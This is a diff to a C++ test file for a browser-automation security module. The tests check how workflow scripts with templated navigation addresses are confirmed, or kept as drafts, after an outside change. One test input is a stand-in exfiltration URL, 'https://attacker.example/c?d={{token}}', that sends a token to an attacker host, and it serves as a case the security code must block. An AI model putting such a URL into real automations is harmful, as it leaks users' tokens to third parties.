@@ -1225,15 +1225,16 @@ TEST(AutomationSecurityTest, ConfirmDraftSitesClearsChangedOutside) {
   EXPECT_EQ(changed.security.trust, TrustLevel::CASUAL);
 }
 
-// A file changed outside whose steps open only {{variable}} addresses (or
-// no page) has no site to confirm: it is confirmed with none. Its
-// whitelist is then empty, so below TRUSTED it opens and acts on no page by
-// itself, and another workflow that runs it adds no site to its run.
+// A file changed outside whose steps open only addresses that start with a
+// {{variable}} (or no page) has no site to confirm: it is confirmed with
+// none. Its whitelist is then empty, so below TRUSTED it opens and acts on
+// no page by itself, and another workflow that runs it adds no site to its
+// run.
 TEST(AutomationSecurityTest, AChangeWithNoSiteIsConfirmedWithNone) {
   Script s;
   s.id = "wf_1";
   s.steps.push_back(MakeStep(StepType::NAVIGATE, "{{url}}"));
-  s.steps.push_back(MakeStep(StepType::NAVIGATE, "https://{{host}}/x"));
+  s.steps.push_back(MakeStep(StepType::NAVIGATE, "{{base}}/search?q={{q}}"));
   s.steps.push_back(MakeStep(StepType::CLICK, "#go"));
   s.steps.push_back(MakeStep(StepType::WAIT, "", "1"));
   // What the file claims.
@@ -1287,25 +1288,49 @@ TEST(AutomationSecurityTest, AChangeWithNoSiteIsConfirmedWithNone) {
 }
 
 // HostsReferencedBy() skips an address with a {{variable}} anywhere in it,
-// a fixed host's too: such a change has no site to confirm either. Once
-// confirmed with none, that address is refused below TRUSTED until a step
-// opens a fixed address on its site.
-TEST(AutomationSecurityTest, AFixedHostWithAValueInItsAddressIsNoSite) {
+// a fixed host's too, so the review would list no site for it. A change
+// with an address that doesn't start with its value (a fixed host, or only
+// a fixed scheme, before it) isn't confirmed with none, so no fixed host
+// goes unshown; nor with sites, having none to confirm. It stays a draft,
+// as before. The same change whose addresses each start with a value is
+// confirmed with none.
+TEST(AutomationSecurityTest, AFixedHostWithAValueInItsAddressIsNotConfirmed) {
+  for (const char* target :
+       {"https://attacker.example/c?d={{token}}",
+        "https://shop.example/search?q={{q}}", "https://shop.example/{{path}}",
+        "https://{{host}}/x", "shop.example/{{path}}"}) {
+    Script s;
+    s.id = "wf_shop";
+    s.steps.push_back(MakeStep(StepType::NAVIGATE, "{{url}}"));
+    s.steps.push_back(MakeStep(StepType::NAVIGATE, target));
+    s.security.sites_unconfirmed = true;
+    s.security.changed_outside = true;
+    EXPECT_TRUE(AutomationSecurity::HostsReferencedBy(s.steps).empty())
+        << target;
+    EXPECT_FALSE(AutomationSecurity::MayConfirmWithoutSites(s)) << target;
+    EXPECT_FALSE(AutomationSecurity::ConfirmDraftSites(s, {})) << target;
+    EXPECT_FALSE(AutomationSecurity::ConfirmDraftSites(s, {"shop.example"}))
+        << target;
+    EXPECT_FALSE(AutomationSecurity::ConfirmDraftSites(s, {"attacker.example"}))
+        << target;
+    EXPECT_TRUE(s.security.sites_unconfirmed) << target;
+    EXPECT_TRUE(s.security.changed_outside) << target;
+    EXPECT_FALSE(AutomationSecurity::MayRunAsChild(s)) << target;
+  }
+  // Each address all a value: confirmed with none.
   Script s;
   s.id = "wf_shop";
-  s.steps.push_back(
-      MakeStep(StepType::NAVIGATE, "https://shop.example/search?q={{q}}"));
+  s.steps.push_back(MakeStep(StepType::NAVIGATE, "{{url}}"));
+  s.steps.push_back(MakeStep(StepType::NAVIGATE, "{{shop}}/search?q={{q}}"));
   s.security.sites_unconfirmed = true;
   s.security.changed_outside = true;
-  EXPECT_TRUE(AutomationSecurity::HostsReferencedBy(s.steps).empty());
   EXPECT_TRUE(AutomationSecurity::MayConfirmWithoutSites(s));
-  EXPECT_FALSE(AutomationSecurity::ConfirmDraftSites(s, {"shop.example"}));
   ASSERT_TRUE(AutomationSecurity::ConfirmDraftSites(s, {}));
   AutomationSecurity sec;
   const SecurityPolicy p = AutomationSecurity::EffectivePolicy(s);
   EXPECT_TRUE(p.domain_whitelist.empty());
   EXPECT_FALSE(sec.AllowNavigation(p, "https://shop.example/search?q=x"));
-  s.default_variables["q"] = "lamp";
+  s.default_variables["url"] = "https://shop.example/";
   EXPECT_EQ(AutomationSecurity::RunWindowStartURL(s, 0), "");
   EXPECT_TRUE(AutomationSecurity::MayRunAsChild(s));
 }
